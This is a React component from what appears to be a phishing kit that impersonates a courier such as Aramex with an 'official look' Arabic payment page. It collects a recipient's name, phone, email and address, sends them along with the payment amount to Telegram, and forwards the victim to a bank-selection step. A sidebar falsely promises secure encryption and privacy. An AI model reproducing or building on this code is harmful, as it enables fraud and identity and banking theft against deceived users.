import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import {
  User,
  Phone,
  Mail,
  Loader2,
  ShieldCheck,
  ChevronLeft,
  Info,
  Lock,
  Building2,
  Package,
  MapPin,
  CheckCircle,
  ArrowLeft
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const PaymentRecipient = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: link, isLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [formData, setFormData] = useState({
    fullName: "",
    phone: "",
    email: "",
    address: ""
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const company = searchParams.get("company") || link?.payload?.service_key || "aramex";
  const branding = getServiceBranding(company);
  const countryCode = link?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);

  useEffect(() => {
    if (link?.payload?.customerInfo) {
      setFormData({
        fullName: link.payload.customerInfo.fullName || "",
        phone: link.payload.customerInfo.phone || "",
        email: link.payload.customerInfo.email || "",
        address: link.payload.customerInfo.address || ""
      });
    }
  }, [link]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.fullName || !formData.phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال البيانات المطلوبة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...link?.payload, customerInfo: formData }
      });

      await sendToTelegram({
        type: 'recipient_data_entered',
        data: {
          ...formData,
          service: link?.payload?.service_name || company,
          amount: formatCurrency(link?.payload?.payment_amount || link?.payload?.cod_amount || 0, link?.payload?.currency_code)
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/bank-selector?company=${company}`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isLoading || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-10 h-10 animate-spin text-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F8FAFC] pb-20" dir="rtl">
      {/* Official Look Header */}
      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
             <BackButton />
             <div className="h-8 w-px bg-gray-200 hidden sm:block" />
             <h1 className="text-lg font-black text-gray-800">بيانات التوصيل والسداد</h1>
          </div>
          {branding.logo && <img src={branding.logo} className="h-8 w-auto object-contain" alt="" />}
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto grid md:grid-cols-5 gap-8">
          <div className="md:col-span-3 space-y-6">
            <Card className="p-8 border-0 shadow-2xl rounded-[2.5rem] bg-white">
               <div className="flex items-center gap-3 mb-8">
                  <div className="w-1.5 h-6 bg-blue-600 rounded-full" />
                  <h2 className="text-xl font-black text-gray-800">أدخل بياناتك الشخصية</h2>
               </div>

               <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="space-y-2">
                     <Label className="text-xs font-black text-gray-400 uppercase">الاسم الكامل للمستلم</Label>
                     <div className="relative group">
                        <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                        <Input
                          value={formData.fullName}
                          onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                          className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white transition-all"
                          placeholder="الاسم كما في الهوية"
                          required
                        />
                     </div>
                  </div>

                  <div className="space-y-2">
                     <Label className="text-xs font-black text-gray-400 uppercase">رقم الجوال</Label>
                     <div className="relative group">
                        <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                        <Input
                          value={formData.phone}
                          onChange={(e) => setFormData({...formData, phone: e.target.value})}
                          className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white text-left"
                          dir="ltr"
                          placeholder="05XXXXXXXX"
                          required
                        />
                     </div>
                  </div>

                  <div className="space-y-2">
                     <Label className="text-xs font-black text-gray-400 uppercase">عنوان التوصيل</Label>
                     <div className="relative group">
                        <MapPin className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                        <Input
                          value={formData.address}
                          onChange={(e) => setFormData({...formData, address: e.target.value})}
                          className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white"
                          placeholder="المدينة، الحي، الشارع"
                        />
                     </div>
                  </div>

                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full h-16 rounded-2xl bg-blue-600 hover:bg-blue-700 text-xl font-black shadow-xl shadow-blue-100 transition-all hover:translate-y-[-2px]"
                  >
                    {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "المتابعة لاختيار البنك"}
                  </Button>
               </form>
            </Card>
          </div>

          <div className="md:col-span-2 space-y-6">
             <Card className="p-6 border-0 shadow-xl rounded-[2rem] bg-white">
                <h3 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-4">ملخص الطلب</h3>
                <div className="space-y-4">
                   <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-gray-50 flex items-center justify-center border border-gray-100"><Package className="w-5 h-5 text-blue-600" /></div>
                      <div>
                        <p className="text-[10px] font-bold text-gray-400">الخدمة</p>
                        <p className="text-sm font-black text-gray-700">{link.payload.service_name}</p>
                      </div>
                   </div>
                   <div className="p-4 rounded-2xl bg-blue-50 border border-blue-100">
                      <p className="text-[10px] font-black text-blue-600 uppercase mb-1">المبلغ الإجمالي للسداد</p>
                      <p className="text-3xl font-black text-blue-800">{formatCurrency(link.payload.payment_amount || link.payload.cod_amount || 0, link.payload.currency_code)}</p>
                   </div>
                </div>
             </Card>

             <div className="p-6 bg-gradient-to-br from-[#1E293B] to-[#334155] rounded-[2rem] text-white space-y-4 shadow-lg">
                <div className="flex items-center gap-2">
                   <ShieldCheck className="w-5 h-5 text-emerald-400" />
                   <p className="text-xs font-black uppercase tracking-widest">تشفير بيانات آمن</p>
                </div>
                <p className="text-[10px] font-bold opacity-60 leading-relaxed">
                   نحن نحافظ على خصوصية بياناتك. يتم معالجة جميع المعلومات عبر بروتوكولات حماية عالمية.
                </p>
             </div>
          </div>
        </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default PaymentRecipient;
